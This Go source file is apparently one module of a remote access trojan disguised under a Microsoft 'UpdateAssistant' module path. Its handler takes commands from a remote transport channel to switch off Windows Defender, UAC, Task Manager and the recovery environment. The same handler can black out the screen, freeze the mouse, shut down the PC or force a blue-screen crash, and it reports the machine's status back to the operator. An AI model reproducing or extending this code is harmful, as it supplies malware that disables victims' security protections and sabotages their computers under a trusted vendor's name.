//go:build windows

package controlpanel

import (
	"encoding/json"
	"sync"

	"github.com/microsoft/UpdateAssistant/modules/logger"
	"github.com/microsoft/UpdateAssistant/modules/sysutil"
	"github.com/microsoft/UpdateAssistant/modules/transport"
)

type Status struct {
	Defender bool `json:"defender"` // true = enabled
	UAC      bool `json:"uac"`
	TaskMgr  bool `json:"taskmgr"`
	Reagentc bool `json:"reagentc"`
	Blackout bool `json:"blackout"` // true = active
	Mouse    bool `json:"mouse"`    // true = frozen
	Volume   int  `json:"volume"`
}

type ErrResult struct {
	ID  string `json:"id"`
	Err string `json:"err"`
}

var (
	mu      sync.Mutex
	current *transport.Client
)

func currentStatus() Status {
	return Status{
		Defender: sysutil.DefenderStatus() == "enabled",
		UAC:      sysutil.UACStatus() == "enabled",
		TaskMgr:  sysutil.TaskMgrStatus() == "enabled",
		Reagentc: sysutil.ReagentcEnabled(),
		Blackout: sysutil.BlackoutStatus(),
		Mouse:    sysutil.MouseFrozen(),
		Volume:   sysutil.VolGet(),
	}
}

func pushStatus(c *transport.Client) {
	c.Send("panel_buttons", currentStatus())
}

func Open(client *transport.Client) {
	mu.Lock()
	defer mu.Unlock()
	current = client
	logger.Info("[cp] open")
	go pushStatus(client)
}

func Close() {
	mu.Lock()
	defer mu.Unlock()
	current = nil
	logger.Info("[cp] closed")
	go sysutil.UnloadControlPanelDLLs()
}

func Handle(client *transport.Client, msgType string, payload json.RawMessage) {
	mu.Lock()
	c := current
	mu.Unlock()
	if c == nil {
		return
	}
	switch msgType {
	case "panel_get":
		go pushStatus(c)
	case "panel_action":
		var p struct {
			ID    string `json:"id"`
			Level int    `json:"level"`
		}
		if json.Unmarshal(payload, &p) != nil || p.ID == "" {
			return
		}
		go func() {
			var errStr string
			switch p.ID {
			case "lock_pc":
				if !sysutil.LockPC() {
					errStr = "lock failed"
				}
			case "shutdown_pc":
				sysutil.ShutdownPC()
			case "restart_pc":
				sysutil.RestartPC()
			case "mouse":
				if _, ok := sysutil.MouseToggle(); !ok {
					errStr = "access denied"
				}
			case "blackout":
				sysutil.BlackoutToggle()
			case "defender":
				if _, ok := sysutil.DefenderToggle(); !ok {
					errStr = "access denied"
				}
			case "uac":
				if _, ok := sysutil.UACToggle(); !ok {
					errStr = "access denied"
				}
			case "taskmgr":
				if _, ok := sysutil.TaskMgrToggle(); !ok {
					errStr = "access denied"
				}
			case "reagentc":
				if _, _, ok := sysutil.ReagentcToggle(); !ok {
					errStr = "reagentc failed"
				}
			case "volume":
				if p.Level >= 0 && p.Level <= 100 {
					sysutil.VolSet(p.Level)
				}
			case "bsod":
				sysutil.BsodTrigger()
			}
			if errStr != "" {
				c.Send("panel_result", ErrResult{ID: p.ID, Err: errStr})
			}
			pushStatus(c)
		}()
	}
}
